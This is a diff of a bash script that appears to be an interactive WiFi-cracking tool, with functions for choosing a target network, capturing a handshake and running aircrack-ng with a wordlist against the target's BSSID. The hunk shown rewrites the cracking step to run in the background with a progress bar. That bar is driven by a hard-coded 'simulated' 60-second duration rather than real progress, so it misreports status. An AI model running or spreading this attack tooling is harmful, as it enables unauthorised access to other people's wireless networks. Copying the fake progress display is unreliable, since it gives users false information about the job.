@@ -135,9 +135,8 @@ startAttacking () {
 
 
     echo -e "
-    ╔══════════════════════════════════════════╗
-    ║        Your Target Network ${YELLOW}$targetAp${NC}          ║
-    ╚══════════════════════════════════════════╝"
+    
+            Your Target Network ${YELLOW}$targetAp${NC}"
     read -p "       [ Press Enter to continue ]"
     read -p "       [*] Do you Have Handshake File [y/n] : " hand_shake
     if [ "$hand_shake" == "yes" ] || [ "$hand_shake" == "y" ]; then
@@ -178,24 +177,43 @@ getHandshake () {
     aircrack_start $currentPath/handshake/psk-01.cap $bssid
 }
 
-aircrack_start () {
+aircrack_start() {
     local capfile=$1
-    local bssid=$2 
+    local bssid=$2
+    local path_wordlist
+
     while true; do
-        read -p "> wordlist Path :> " path_wordlist
+        read -p "       #> wordlist Path :> " path_wordlist
         if [ -f "$path_wordlist" ]; then
-            konsole --geometry 100x650 -e "aircrack-ng -w $path_wordlist -b $bssid $capfile" 2>/dev/null
-            read "[ Press Enter When you Finish ]"
+            clear
+
+            echo "Starting aircrack-ng with the following parameters:"
+            echo "    Capture File: $capfile"
+            echo "    BSSID: $bssid"
+            echo "    Wordlist Path: $path_wordlist"
+            echo
+
+            # Start aircrack-ng and show progress
+            ( aircrack-ng -w "$path_wordlist" -b "$bssid" "$capfile" 2>&1) &
+
+            local pid=$!
+            local duration=60 # Simulated duration for progress bar (in seconds)
+            local start_time=$(date +%s)
+
+            while kill -0 $pid 2>/dev/null; do
+                local elapsed=$(($(date +%s) - start_time))
+                local progress=$(( (elapsed * 100) / duration ))
+                local bar=$(printf "%${progress}s" | tr ' ' '#')
+                printf "\rProgress: [%-100s] %d%%" "$bar" "$progress"
+                sleep 1
+            done
+            echo "aircrack-ng has completed."
             break
         else
-            echo "[!] File doesn't not exist try Another Path"
+            echo "[!] File does not exist. Try another path."
         fi
     done
-
 }
-
-
-
 
 
 
